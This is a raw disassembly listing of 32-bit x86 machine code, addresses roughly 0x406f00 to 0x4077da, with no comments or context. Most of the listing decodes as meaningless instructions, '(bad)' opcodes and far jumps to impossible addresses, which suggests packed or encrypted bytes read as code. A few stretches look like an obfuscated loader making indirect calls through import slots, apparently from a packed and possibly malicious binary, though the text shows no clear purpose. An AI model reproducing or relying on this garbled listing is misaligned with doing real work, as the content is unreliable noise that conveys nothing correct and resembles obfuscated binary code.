  406f00:	sub    BYTE PTR [edx+0x708049cf],0x3a
  406f07:	mov    eax,ds:0xdec492d0
  406f0c:	je     0x406eac
  406f0e:	pop    ss
  406f0f:	xlat   BYTE PTR ds:[ebx]
  406f10:	mov    eax,0x147c5ae4
  406f15:	cmc    
  406f16:	cmp    esi,DWORD PTR [ebp-0x18]
  406f19:	shl    DWORD PTR [edx+0x44145bbc],1
  406f1f:	mov    al,ds:0x4124d671
  406f24:	cs add eax,0x3cf148b4
  406f2a:	(bad)  
  406f2b:	lea    ebx,[esi+0xf]
  406f2e:	(bad)  
  406f2f:	mov    dh,0x6
  406f31:	mov    edi,0x7ae0a1a
  406f36:	(bad)  
  406f37:	ss sub eax,0xa8035bb6
  406f3d:	stos   BYTE PTR es:[edi],al
  406f3e:	fstp   TBYTE PTR [esi+0x2a5ad05a]
  406f44:	pop    es
  406f45:	mov    ecx,ecx
  406f47:	in     al,0x11
  406f49:	test   BYTE PTR [edx],ch
  406f4b:	pop    ss
  406f4c:	dec    ebx
  406f4d:	ja     0x406f19
  406f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f50:	inc    esp
  406f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f52:	adc    DWORD PTR [eax+edi*4-0x5551c3c4],esi
  406f59:	mov    edx,0xfe1e570d
  406f5e:	neg    eax
  406f60:	test   DWORD PTR [esi+0x0],edx
  406f63:	imul   edi,DWORD PTR [esi],0xf3000f48
  406f69:	loopne 0x406f76
  406f6b:	daa    
  406f6c:	mov    ecx,0xd12a4439
  406f71:	stos   DWORD PTR es:[edi],eax
  406f72:	mov    ebx,esp
  406f74:	cwde   
  406f75:	int    0x6d
  406f77:	pop    ds
  406f78:	iret   
  406f79:	call   0xa09c:0x75c6b6ff
  406f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f81:	dec    ebp
  406f82:	or     ebx,DWORD PTR [eax+esi*8]
  406f85:	adc    eax,DWORD PTR [esi+0x64]
  406f88:	inc    esp
  406f89:	mov    ds:0x6f8d923,al
  406f8e:	push   eax
  406f8f:	add    dh,BYTE PTR ds:0xbb9014c0
  406f95:	xchg   DWORD PTR [ebx],esp
  406f97:	iret   
  406f98:	adc    bl,BYTE PTR [edi-0x74bdc8a1]
  406f9e:	hlt    
  406f9f:	fst    DWORD PTR [ebx-0x21849c1b]
  406fa5:	dec    eax
  406fa6:	imul   BYTE PTR [bx+si+0x69]
  406faa:	mov    bl,0xec
  406fac:	pop    ecx
  406fad:	push   eax
  406fae:	inc    ebp
  406faf:	les    edx,FWORD PTR ds:0x118d2c34
  406fb5:	(bad)  
  406fb6:	popf   
  406fb7:	and    al,0xed
  406fb9:	xor    ebx,DWORD PTR [esi-0x59edb01a]
  406fbf:	and    ch,BYTE PTR [ebx-0x52ceb8aa]
  406fc5:	es mov edx,0x5b343da7
  406fcb:	ja     0x40700b
  406fcd:	inc    eax
  406fce:	sub    bl,BYTE PTR [edi-0x563037c4]
  406fd4:	retf   
  406fd5:	push   esi
  406fd6:	sub    eax,0xba6cc0a8
  406fdb:	dec    ecx
  406fdc:	rcl    BYTE PTR [ebp-0x41],1
  406fdf:	pop    esp
  406fe0:	fsubp  st(1),st
  406fe2:	push   0xffffffb5
  406fe4:	xor    al,0xce
  406fe6:	cdq    
  406fe7:	inc    ebp
  406fe8:	xchg   DWORD PTR [edi-0xc],edx
  406feb:	sbb    ebx,ebp
  406fed:	push   ss
  406fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fef:	push   es
  406ff0:	xchg   edi,eax
  406ff1:	sub    eax,0xa4d53f4d
  406ff6:	sbb    DWORD PTR [ecx-0x44],ecx
  406ff9:	jns    0x406fc3
  406ffb:	xbegin 0x4691c574
  407001:	pop    ecx
  407002:	jo     0x406f92
  407004:	shr    BYTE PTR [eax],1
  407006:	aad    0xc2
  407008:	sub    BYTE PTR [edi-0x21],ah
  40700b:	fmulp  st(7),st
  40700d:	popa   
  40700e:	add    al,0xf
  407010:	mov    esi,0x441be2f3
  407015:	out    dx,al
  407016:	lds    ebx,FWORD PTR [eax+0x250f421d]
  40701c:	outs   dx,DWORD PTR ds:[esi]
  40701d:	sbb    DWORD PTR [ecx-0x7],ebp
  407020:	jns    0x407024
  407022:	push   ss
  407023:	jp     0x40705d
  407025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407026:	and    edi,esp
  407028:	and    al,0x99
  40702a:	es jg  0x40703d
  40702d:	pop    eax
  40702e:	loope  0x406fed
  407030:	jbe    0x40701d
  407032:	mov    bh,0x91
  407034:	jnp    0x40707b
  407036:	adc    al,0xd6
  407038:	mov    esi,0xf5821184
  40703d:	rol    BYTE PTR [ecx+0x5639bb],0xd1
  407044:	xchg   ebx,eax
  407045:	mov    ebp,0x29addaff
  40704a:	adc    ecx,DWORD PTR [edi]
  40704c:	mov    cl,0xc3
  40704e:	ja     0x407053
  407050:	in     al,0xc7
  407052:	ds psubusw mm6,mm5
  407056:	addr16 (bad) 
  407058:	sub    bh,BYTE PTR [eax+ecx*4]
  40705b:	les    ebx,FWORD PTR [edx-0x67931e1d]
  407061:	imul   esp,DWORD PTR [eax],0x74eaace9
  407067:	sahf   
  407068:	addr16 (bad) 
  40706a:	ins    BYTE PTR es:[edi],dx
  40706b:	sbb    al,0x5d
  40706d:	(bad)  
  40706e:	out    dx,eax
  40706f:	test   BYTE PTR [eax],ah
  407071:	push   edi
  407072:	mov    esi,ebp
  407074:	ret    0xb42c
  407077:	and    al,dl
  407079:	push   esp
  40707a:	arpl   dx,cx
  40707c:	sbb    cl,BYTE PTR [edx+0x75]
  40707f:	inc    ecx
  407080:	adc    ebp,DWORD PTR [ebx]
  407082:	dec    edx
  407083:	dec    eax
  407084:	hlt    
  407085:	push   DWORD PTR [ecx+0x50bfff20]
  40708b:	pop    ecx
  40708c:	jne    0x40704f
  40708e:	mov    ds:0x2145636b,al
  407093:	gs jmp 0xbf89:0xa52bcf99
  40709b:	hlt    
  40709c:	mov    eax,ds:0xf5550667
  4070a1:	and    esi,DWORD PTR [eax-0x3b]
  4070a4:	mov    ?,WORD PTR [edi+0x4e]
  4070a7:	mov    dh,BYTE PTR [ecx]
  4070a9:	cmp    al,0x9b
  4070ab:	rcl    ah,cl
  4070ad:	mov    edi,DWORD PTR [esi]
  4070af:	out    0x63,al
  4070b1:	xchg   edx,eax
  4070b2:	xchg   ebp,eax
  4070b3:	or     esp,DWORD PTR [edx+0x6c]
  4070b6:	ror    BYTE PTR [edx+0x2fdcb076],cl
  4070bc:	aam    0xad
  4070be:	inc    ebx
  4070bf:	sbb    bl,bh
  4070c1:	mov    eax,ds:0xcb1bfb67
  4070c6:	push   ebp
  4070c7:	push   ds
  4070c8:	out    0x9d,al
  4070ca:	cdq    
  4070cb:	jp     0x407069
  4070cd:	aaa    
  4070ce:	or     edi,DWORD PTR [ebp-0x51ba47b8]
  4070d4:	pop    eax
  4070d5:	aad    0x30
  4070d7:	adc    DWORD PTR [eax+ebp*4-0x7b],esi
  4070db:	xchg   ebx,eax
  4070dc:	sub    BYTE PTR [ebx+0x33],al
  4070df:	or     DWORD PTR [edi],eax
  4070e1:	mov    ds:0xcee01f3e,eax
  4070e6:	sbb    BYTE PTR [edi+0x591709f2],0xfa
  4070ed:	fs out dx,eax
  4070ef:	retf   
  4070f0:	mov    bh,0x73
  4070f2:	pop    esi
  4070f3:	sbb    DWORD PTR [ebp-0x7feda549],ebx
  4070f9:	inc    esp
  4070fa:	mov    WORD PTR ds:0x5384bcfa,di
  407101:	sbb    al,0x9b
  407103:	ins    DWORD PTR es:[edi],dx
  407104:	in     eax,dx
  407105:	or     BYTE PTR [esi+0x56],dh
  407108:	and    DWORD PTR [ecx+0x64],esp
  40710b:	cmp    ebx,DWORD PTR [ebp-0x37055c65]
  407111:	mov    al,ds:0x21d9ea09
  407116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407117:	fwait
  407118:	and    BYTE PTR [eax-0x36f02823],0x66
  40711f:	xchg   ebp,eax
  407120:	xlat   BYTE PTR ds:[ebx]
  407121:	mov    ebp,ebp
  407123:	or     ch,BYTE PTR ds:0xa9aaf8c6
  407129:	or     DWORD PTR [eax-0x58f10fb4],ebp
  40712f:	add    al,0x98
  407131:	xor    dl,al
  407133:	mov    bl,0x7f
  407135:	and    eax,0xf8f94e84
  40713a:	lods   eax,DWORD PTR ds:[esi]
  40713b:	adc    cl,BYTE PTR [eax+0x2d2d2dfa]
  407141:	scas   al,BYTE PTR es:[edi]
  407142:	adc    BYTE PTR [ebx],bl
  407144:	test   eax,0xd601fc30
  407149:	adc    bh,BYTE PTR [eax]
  40714b:	jmp    0x8328a888
  407150:	out    dx,al
  407151:	data16 sub BYTE PTR [eax+esi*4],bh
  407155:	mov    ebp,0xa3d758d7
  40715a:	ret    0xfa00
  40715d:	mov    fs,eax
  40715f:	cmp    ch,BYTE PTR [ebx]
  407161:	jg     0x4070ef
  407163:	mov    bl,0x90
  407165:	push   ebx
  407166:	mov    edx,0x987b0cda
  40716b:	icebp  
  40716c:	push   esp
  40716d:	repz aad 0xb8
  407170:	clc    
  407171:	mov    ch,BYTE PTR [ebx]
  407173:	popf   
  407174:	mov    DWORD PTR [ebp-0x24],eax
  407177:	sbb    DWORD PTR ds:0x428211,edi
  40717d:	mov    DWORD PTR [ebp-0x20],0xcb89b672
  407184:	mov    DWORD PTR [ebp-0x1c],eax
  407187:	and    ecx,0x787c
  40718d:	mov    DWORD PTR [ebp-0x14],0x22b7
  407194:	and    DWORD PTR ds:0x428281,0x154a
  40719e:	mov    eax,ds:0x4226f0
  4071a3:	adc    DWORD PTR ds:0x4281a1,0x428195
  4071ad:	mov    ecx,DWORD PTR [ebp-0x14]
  4071b0:	or     eax,0x2e73
  4071b5:	dec    DWORD PTR ds:0x428199
  4071bb:	and    ecx,eax
  4071bd:	mov    eax,ds:0x4281e9
  4071c2:	mov    eax,DWORD PTR [eax]
  4071c4:	sub    DWORD PTR ds:0x428201,eax
  4071ca:	imul   ecx,ecx,0x5997
  4071d0:	sub    ecx,0x697b
  4071d6:	mov    DWORD PTR [ebp-0x1c],ecx
  4071d9:	xor    eax,eax
  4071db:	or     eax,DWORD PTR ds:0x428295
  4071e1:	mov    eax,DWORD PTR [eax]
  4071e3:	adc    DWORD PTR ds:0x42823d,eax
  4071e9:	mov    DWORD PTR [ebp-0x4],0x3d3f
  4071f0:	xor    ecx,eax
  4071f2:	mov    DWORD PTR [ebp-0xc],0x2a8a
  4071f9:	cmp    DWORD PTR ds:0x428221,0x0
  407200:	mov    ecx,0x20d9
  407205:	mov    ecx,0x24c0
  40720a:	mov    DWORD PTR ds:0x42820d,0x66a2
  407214:	jmp    0x407282
  407219:	mov    eax,0x9f9
  40721e:	mov    DWORD PTR ds:0x428239,0x4b25
  407228:	cmp    DWORD PTR ds:0x428221,0x0
  40722f:	je     0x407270
  407235:	push   0x50fa
  40723a:	push   0x14b1
  40723f:	push   DWORD PTR [ebp-0x1c]
  407242:	push   DWORD PTR [ebp-0xc]
  407245:	push   0x1c3b
  40724a:	call   DWORD PTR ds:0x4289d8
  407250:	and    ecx,DWORD PTR ds:0x42819d
  407256:	sub    ecx,DWORD PTR ds:0x428279
  40725c:	mov    ecx,DWORD PTR ds:0x4282a5
  407262:	mov    ecx,DWORD PTR [ecx]
  407264:	adc    DWORD PTR ds:0x428215,ecx
  40726a:	sub    DWORD PTR ds:0x428279,ecx
  407270:	sbb    DWORD PTR ds:0x4281ad,0x3dfa
  40727a:	xor    ecx,ecx
  40727c:	sbb    DWORD PTR ds:0x428205,ecx
  407282:	mov    DWORD PTR [ebp-0x14],0x1935
  407289:	mov    eax,DWORD PTR [ebp-0x14]
  40728c:	sub    ecx,DWORD PTR ds:0x4281a9
  407292:	mov    ecx,DWORD PTR [ebp-0xc]
  407295:	sbb    DWORD PTR ds:0x428215,0x428241
  40729f:	jmp    0x407538
  4072a4:	jmp    0x4072d1
  4072a6:	sub    al,ch
  4072a8:	sub    eax,esp
  4072aa:	xor    al,0x35
  4072ac:	fmul   DWORD PTR [esi+0x728c315f]
  4072b2:	repz das 
  4072b4:	cmp    DWORD PTR [eax-0x45],eax
  4072b7:	mov    ebx,0xbbbbbfaa
  4072bc:	sbb    dl,BYTE PTR [ecx+0x732752ac]
  4072c2:	enter  0xaefb,0x6e
  4072c6:	montmul (bad)
  4072c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072c8:	sub    DWORD PTR [edi],0x24335f8
  4072ce:	(bad)  
  4072cf:	jle    0x5960
  4072d4:	ins    DWORD PTR es:[edi],dx
  4072d5:	xchg   ecx,eax
  4072d6:	pop    edi
  4072d7:	adc    al,0xad
  4072d9:	mov    bl,0xa0
  4072db:	nop
  4072dc:	sti    
  4072dd:	loopne 0x4072d8
  4072df:	gs dec edi
  4072e1:	xor    BYTE PTR [ebx],0xdf
  4072e4:	jmp    0x40726d
  4072e6:	inc    ecx
  4072e7:	lods   al,BYTE PTR ds:[esi]
  4072e8:	dec    ecx
  4072e9:	sub    ch,BYTE PTR [ebx+eiz*8-0x2eeea2b2]
  4072f0:	jno    0x4072d2
  4072f2:	pop    ecx
  4072f3:	ins    DWORD PTR es:[edi],dx
  4072f4:	mov    ebp,0xcb76cb17
  4072f9:	jge    0x40730c
  4072fb:	mov    dh,0xf5
  4072fd:	idiv   BYTE PTR [edx]
  4072ff:	push   cs
  407300:	fst    QWORD PTR [eax-0x28]
  407303:	stc    
  407304:	ins    DWORD PTR es:[edi],dx
  407305:	scas   al,BYTE PTR es:[edi]
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	dec    esp
  407308:	mov    dl,0x5c
  40730a:	ins    BYTE PTR es:[edi],dx
  40730b:	scas   eax,DWORD PTR es:[edi]
  40730c:	jmp    0xa5cb:0x431b3a35
  407313:	icebp  
  407314:	loopne 0x407343
  407316:	jmp    0x4072de
  407318:	jge    0x407358
  40731a:	jg     0x407358
  40731c:	popf   
  40731d:	cmp    eax,0x1d4a84c
  407322:	jbe    0x407302
  407324:	fidiv  WORD PTR [edi]
  407326:	mov    ebp,0x74fc7a4d
  40732b:	jo     0x407348
  40732d:	and    ecx,edi
  40732f:	push   es
  407330:	push   0xd553e1d6
  407335:	jae    0x4073a6
  407337:	sbb    bl,0xad
  40733a:	inc    eax
  40733b:	adc    ah,BYTE PTR [ecx]
  40733d:	or     al,0x8
  40733f:	(bad)  
  407340:	push   esi
  407341:	daa    
  407342:	mov    bl,al
  407344:	jl     0x407396
  407346:	inc    esp
  407347:	rcl    DWORD PTR [ebx-0x9],0x85
  40734b:	inc    ecx
  40734c:	or     al,al
  40734e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40734f:	inc    edx
  407350:	mov    edx,?
  407352:	lock push edx
  407354:	aad    0x5c
  407356:	aad    0x8f
  407358:	jg     0x407365
  40735a:	cmp    al,0x51
  40735c:	fs inc ecx
  40735e:	enter  0x4714,0x3b
  407362:	xor    esp,ebx
  407364:	mov    ds:0x3120bead,eax
  407369:	fstp   TBYTE PTR [edi-0x4cd1f797]
  40736f:	sbb    DWORD PTR [edx-0x4b9143f7],eax
  407375:	call   0xf563:0x72c5749c
  40737c:	add    bl,BYTE PTR [edx+ecx*4+0x4ce42074]
  407383:	inc    edx
  407384:	xor    al,BYTE PTR [edi-0x254cf8d]
  40738a:	or     eax,0x16b317c0
  40738f:	and    al,0x8d
  407391:	test   eax,0x67d71b39
  407396:	or     ecx,DWORD PTR [eax]
  407398:	sub    BYTE PTR [eax+0x2a349ed6],bh
  40739e:	xchg   esp,eax
  40739f:	cmp    BYTE PTR [edx],ah
  4073a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073a2:	sbb    ecx,esi
  4073a4:	adc    al,dl
  4073a6:	jmp    0xd91fb8a2
  4073ab:	pop    ss
  4073ac:	neg    BYTE PTR [eax]
  4073ae:	jmp    0x9aa82649
  4073b3:	ret    0x8ed3
  4073b6:	pop    es
  4073b7:	aad    0x5a
  4073b9:	push   es
  4073ba:	(bad)  
  4073bb:	cmp    al,0x76
  4073bd:	push   eax
  4073be:	sbb    eax,0xcf77f800
  4073c3:	jbe    0x407410
  4073c5:	idiv   DWORD PTR [ecx+0x37]
  4073c8:	mov    eax,0xbf6fd307
  4073cd:	gs mov esp,0x9740d388
  4073d3:	xor    ecx,ebx
  4073d5:	test   al,0xdd
  4073d7:	(bad)  
  4073d9:	mov    ?,WORD PTR [edi-0x295092ad]
  4073df:	dec    edx
  4073e0:	arpl   WORD PTR [edx],dx
  4073e2:	lock jb 0x407438
  4073e5:	sub    eax,DWORD PTR [ebx-0x37886a2b]
  4073eb:	jno    0x4073c0
  4073ed:	or     al,0x6
  4073ef:	and    eax,0x3222e3c3
  4073f4:	mov    eax,ds:0xf5e0f2f1
  4073f9:	rcl    edx,1
  4073fb:	dec    esp
  4073fc:	cmp    DWORD PTR [ebx-0x78a16eed],edx
  407402:	cmp    DWORD PTR [edx+0x77],eax
  407405:	sbb    edi,DWORD PTR [edi]
  407407:	mov    al,0x77
  407409:	and    al,0xce
  40740b:	xchg   BYTE PTR ds:0x5e96e15b,bl
  407411:	and    dl,BYTE PTR [ebx+0x261831b2]
  407417:	inc    ebx
  407418:	ja     0x40744c
  40741a:	xchg   BYTE PTR [edx],dl
  40741c:	xor    BYTE PTR [eax+0x7e],0xa6
  407420:	out    dx,eax
  407421:	loope  0x4073b7
  407423:	outs   dx,BYTE PTR ds:[esi]
  407424:	ins    BYTE PTR es:[edi],dx
  407425:	dec    ecx
  407426:	aam    0x98
  407428:	(bad)  
  407429:	popf   
  40742a:	and    cl,BYTE PTR [eax]
  40742c:	ds popa 
  40742e:	gs or  al,0x16
  407431:	cs jmp 0xe0cf:0xd6fafe75
  407439:	into   
  40743a:	sub    edi,edi
  40743c:	jg     0x407424
  40743e:	pop    ecx
  40743f:	mov    ah,0x83
  407441:	or     eax,0x88523423
  407446:	mov    bl,0xd4
  407448:	mov    ds:0x9f679e14,eax
  40744d:	sub    al,0xcc
  40744f:	fst    DWORD PTR [esp+eiz*2-0x19]
  407453:	xor    DWORD PTR [ecx],edx
  407455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407456:	push   ss
  407457:	mov    WORD PTR [esi+ecx*2-0x25],gs
  40745b:	pop    ds
  40745c:	mov    ecx,0xa3f34604
  407461:	loopne 0x4074bd
  407463:	jmp    0x4074a0
  407465:	sub    al,0xac
  407467:	or     eax,0xed76d0c1
  40746c:	scas   al,BYTE PTR es:[edi]
  40746d:	std    
  40746e:	mov    dl,0x4e
  407470:	(bad)  
  407471:	out    dx,al
  407472:	mov    edi,0x497122a8
  407477:	shr    DWORD PTR [edi-0x1957ac41],0x8e
  40747e:	mov    esp,0x363f5b9
  407483:	repnz and eax,0x69359528
  407489:	sbb    dl,BYTE PTR [esi+0x20]
  40748c:	dec    ebx
  40748d:	inc    DWORD PTR [esi-0x2f009643]
  407493:	fsubr  DWORD PTR [ebp+0xe5f0509]
  407499:	mov    ch,0x8a
  40749b:	addr16 dec esi
  40749d:	xor    al,0x15
  40749f:	sub    eax,0xe4cc0ebd
  4074a4:	dec    edx
  4074a5:	test   dl,dl
  4074a7:	jne    0x4074b5
  4074a9:	loop   0x407441
  4074ab:	in     eax,dx
  4074ac:	adc    eax,0xe31e17b9
  4074b1:	sub    edx,DWORD PTR [edi+0x3cf828ce]
  4074b7:	adc    bh,BYTE PTR [edi+eiz*4+0x64]
  4074bb:	xor    BYTE PTR [esi+0x17bb2663],bh
  4074c1:	(bad)  
  4074c2:	(bad)  
  4074c3:	xor    ch,BYTE PTR [esi-0x61cb25a9]
  4074c9:	mov    dl,0x82
  4074cb:	cmp    al,0xa9
  4074cd:	xchg   edx,eax
  4074ce:	stc    
  4074cf:	push   es
  4074d0:	lock cmc 
  4074d2:	test   DWORD PTR [esi],esi
  4074d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d5:	loope  0x40747e
  4074d7:	lock pop ds
  4074d9:	mov    dh,0xd4
  4074db:	jecxz  0x4074d6
  4074dd:	cmp    BYTE PTR ds:0xb9b36b72,ah
  4074e3:	jmp    0x98a6b09e
  4074e8:	jnp    0x4074f4
  4074ea:	fs xor al,0xbe
  4074ed:	test   eax,0xa223c98c
  4074f2:	stos   BYTE PTR es:[edi],al
  4074f3:	mov    ch,0x49
  4074f5:	int    0x3
  4074f7:	xchg   edi,eax
  4074f8:	leave  
  4074f9:	mov    ds:0x3c1737d,eax
  4074fe:	add    eax,0x6bc3f28b
  407503:	sub    eax,edx
  407505:	outs   dx,DWORD PTR ds:[esi]
  407506:	inc    ecx
  407507:	jge    0x4074b8
  407509:	enter  0xcdcd,0x6c
  40750d:	add    BYTE PTR [eax+0x7f1a3b50],ah
  407513:	sbb    eax,0x2e40c441
  407518:	pop    ebp
  407519:	out    dx,eax
  40751a:	sbb    DWORD PTR [edi-0x1c494f0e],ecx
  407520:	mov    dl,0x5f
  407522:	xor    BYTE PTR [edi+0x507143cd],dl
  407528:	adc    esi,DWORD PTR [ecx+esi*4]
  40752b:	mov    al,0x94
  40752d:	in     al,0x77
  40752f:	sub    al,bh
  407531:	data16 mov bl,0xc2
  407534:	mov    dh,0x2
  407536:	xchg   ch,dh
  407538:	shr    eax,1
  40753a:	adc    DWORD PTR ds:0x428219,0x65da
  407544:	and    eax,ecx
  407546:	cmp    DWORD PTR ds:0x428235,0x0
  40754d:	mov    DWORD PTR ds:0x428205,0x5dbf
  407557:	mov    DWORD PTR ds:0x42819d,0x4744
  407561:	movzx  ecx,WORD PTR ds:0x428279
  407568:	jmp    0x4075ca
  40756d:	mov    DWORD PTR ds:0x4281b1,0x2126
  407577:	mov    DWORD PTR ds:0x428209,edx
  40757d:	cmp    DWORD PTR ds:0x428235,0x0
  407584:	jg     0x4075a1
  40758a:	push   0x46d4
  40758f:	call   DWORD PTR ds:0x4289dc
  407595:	add    DWORD PTR ds:0x42822d,ebx
  40759b:	sub    DWORD PTR ds:0x4282c9,edi
  4075a1:	or     ecx,0x5683
  4075a7:	or     ecx,DWORD PTR ds:0x428281
  4075ad:	xor    DWORD PTR ds:0x42827d,0x428201
  4075b7:	or     DWORD PTR ds:0x42827d,edi
  4075bd:	movzx  ecx,WORD PTR ds:0x4281ad
  4075c4:	or     DWORD PTR ds:0x428201,ecx
  4075ca:	mov    ecx,DWORD PTR ds:0x4226f8
  4075d0:	xor    edx,edx
  4075d2:	div    ecx
  4075d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4075d7:	xor    edx,edx
  4075d9:	sub    eax,ecx
  4075db:	mov    ecx,DWORD PTR ds:0x4226f4
  4075e1:	div    ecx
  4075e3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4075e6:	cmp    ecx,eax
  4075e8:	je     0x4084d1
  4075ee:	mov    eax,0x39b0
  4075f3:	mov    WORD PTR [ebp-0xc],ax
  4075f7:	mov    eax,0x290
  4075fc:	mov    WORD PTR [ebp-0x4],ax
  407600:	movzx  eax,WORD PTR [ebp-0x4]
  407604:	mov    ecx,0x353
  407609:	add    ax,cx
  40760c:	mov    ecx,0x5ca
  407611:	and    ax,cx
  407614:	mov    cx,WORD PTR [ebp-0xc]
  407618:	add    ax,cx
  40761b:	movzx  ecx,WORD PTR ds:0x4226fc
  407622:	push   0x5
  407624:	xor    eax,ecx
  407626:	mov    WORD PTR [ebp-0x14],ax
  40762a:	mov    eax,0x60b5
  40762f:	mov    WORD PTR [ebp-0x4],ax
  407633:	mov    eax,0x6978
  407638:	mov    WORD PTR [ebp-0xc],ax
  40763c:	mov    ax,ds:0x422704
  407642:	mov    ecx,0x708e
  407647:	xor    ax,cx
  40764a:	mov    cx,WORD PTR [ebp-0xc]
  40764e:	imul   cx,ax
  407652:	mov    ax,ds:0x422700
  407658:	sub    cx,ax
  40765b:	mov    ax,WORD PTR [ebp-0x4]
  40765f:	movzx  ecx,cx
  407662:	jmp    0x4078fb
  407667:	sub    esp,eax
  407669:	push   eax
  40766a:	adc    edi,DWORD PTR [edi+edx*4-0x7a910a57]
  407671:	ins    DWORD PTR es:[edi],dx
  407672:	inc    ebp
  407673:	ins    BYTE PTR es:[edi],dx
  407674:	fcom   st(0)
  407676:	sti    
  407677:	sub    BYTE PTR [edx-0x45],al
  40767a:	mov    ebx,0xbbbbbfaa
  40767f:	fwait
  407680:	sbb    edx,edi
  407682:	add    dh,cl
  407684:	sti    
  407685:	push   0xcb9485e7
  40768a:	and    eax,DWORD PTR [edx+0x32879fd5]
  407690:	cmp    al,BYTE PTR [ebx]
  407692:	mov    esi,0x26c9ab6d
  407697:	inc    ebp
  407698:	sub    ecx,DWORD PTR [eax]
  40769a:	pop    edx
  40769b:	pop    es
  40769c:	push   esi
  40769d:	dec    eax
  40769e:	cdq    
  40769f:	retf   0x77cb
  4076a2:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4076a4:	call   0xf631:0x6c083d78
  4076ab:	jecxz  0x407674
  4076ad:	or     ah,BYTE PTR [esi]
  4076af:	mov    bl,0xbd
  4076b1:	push   es
  4076b2:	cli    
  4076b3:	fxch   st(2)
  4076b5:	inc    ebx
  4076b6:	int    0x19
  4076b8:	dec    esi
  4076b9:	adc    ebp,DWORD PTR [eax+0x628b9a06]
  4076bf:	fimul  DWORD PTR [edx-0x4a55b578]
  4076c5:	mov    ds:0x4fcf5a8d,al
  4076ca:	pop    esi
  4076cb:	dec    esi
  4076cc:	push   0xc676f61b
  4076d1:	and    eax,DWORD PTR [ebx]
  4076d3:	pop    es
  4076d4:	dec    ebx
  4076d5:	shr    BYTE PTR [esi*2+0x1d7a096],cl
  4076dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076dd:	ss add edi,esp
  4076e0:	pop    esp
  4076e1:	lahf   
  4076e2:	shr    DWORD PTR [ebx+0x658af3f4],1
  4076e8:	pop    edi
  4076e9:	out    dx,al
  4076ea:	jl     0x4076ec
  4076ec:	pusha  
  4076ed:	xor    BYTE PTR [eax+0x3b2a657],0xe6
  4076f4:	or     BYTE PTR [esi],0x21
  4076f7:	push   0x8cc43218
  4076fc:	dec    edi
  4076fd:	xchg   ebp,eax
  4076fe:	cwde   
  4076ff:	jl     0x40773c
  407701:	xor    DWORD PTR [ebx+0x4c391da1],ebp
  407707:	sti    
  407708:	sbb    al,0x56
  40770a:	mov    ebp,0x954ca180
  40770f:	push   edi
  407710:	int3   
  407711:	dec    esp
  407712:	aam    0x22
  407714:	popa   
  407715:	inc    esp
  407716:	xor    BYTE PTR [ecx-0x4e],bl
  407719:	jne    0x4076f0
  40771b:	adc    eax,DWORD PTR [eax]
  40771d:	push   ebx
  40771e:	addr16 sub al,0x1e
  407721:	adc    al,0xb3
  407723:	aas    
  407724:	cli    
  407725:	xchg   esi,eax
  407727:	mov    ebx,0xdf2b6351
  40772c:	pop    edx
  40772d:	pop    ds
  40772e:	sbb    al,0x61
  407730:	arpl   WORD PTR [eax-0x12294ea2],si
  407736:	iret   
  407737:	mov    esp,edi
  407739:	imul   ebp,DWORD PTR [ecx*1+0x2ace6b54],0xbdb952b7
  407744:	loope  0x407779
  407746:	mov    al,ds:0x5dfa8d4b
  40774b:	out    0xea,eax
  40774d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40774e:	loopne 0x4076e1
  407750:	adc    al,0x48
  407752:	daa    
  407753:	icebp  
  407754:	sbb    al,0x4b
  407756:	xchg   ebp,eax
  407757:	jae    0x407709
  407759:	push   edx
  40775a:	xchg   bl,bh
  40775c:	mov    eax,0xf1445e47
  407761:	lea    esi,[eax-0x7b]
  407764:	pop    eax
  407765:	mov    esi,0xedb205f9
  40776b:	add    eax,0x76a73bc7
  407770:	sub    esp,DWORD PTR [ecx-0x1aaf83ec]
  407776:	inc    esi
  407777:	and    al,0x2e
  407779:	xor    edx,DWORD PTR [ecx+0x4]
  40777c:	aam    0xd2
  40777e:	shl    DWORD PTR [ecx],0x7b
  407781:	popf   
  407782:	js     0x407784
  407784:	fnstsw WORD PTR [ebx+0x74]
  407787:	inc    edx
  407788:	adc    bl,cl
  40778a:	xlat   BYTE PTR ds:[ebx]
  40778b:	js     0x40776d
  40778d:	push   cs
  40778e:	xor    BYTE PTR [ecx],bl
  407790:	mov    bl,0x3
  407792:	xchg   ebp,eax
  407793:	xchg   edi,eax
  407794:	xor    eax,0xe4fb2b3b
  407799:	adc    eax,0x23849b4c
  40779e:	xchg   ebx,eax
  40779f:	mov    si,0xeeff
  4077a3:	fnsave [ecx]
  4077a5:	stc    
  4077a6:	inc    esp
  4077a7:	cmp    ch,BYTE PTR [esi]
  4077a9:	in     eax,0x66
  4077ab:	push   ecx
  4077ac:	call   0x6e78:0x73c0d232
  4077b3:	aas    
  4077b4:	out    dx,al
  4077b5:	jmp    0x4077f2
  4077b7:	loop   0x40776a
  4077b9:	add    al,0x79
  4077bb:	mov    ds:0xf678b976,al
  4077c0:	ins    BYTE PTR es:[edi],dx
  4077c1:	ret    0x9ed3
  4077c4:	cmp    ah,bl
  4077c6:	fs in  eax,dx
  4077c8:	lods   al,BYTE PTR ds:[esi]
  4077c9:	stos   DWORD PTR es:[edi],eax
  4077ca:	lds    ebp,FWORD PTR [edi+0x31]
  4077cd:	(bad)  
  4077ce:	out    0xd7,eax
  4077d0:	push   esi
  4077d1:	push   edx
  4077d2:	lods   eax,DWORD PTR ds:[esi]
  4077d3:	ret    
  4077d4:	xor    al,0xe4
  4077d6:	mov    ch,dl
  4077d8:	push   ecx
  4077d9:	xlat   BYTE PTR ds:[ebx]
  4077da:	mov    BYTE PTR [esi],dl
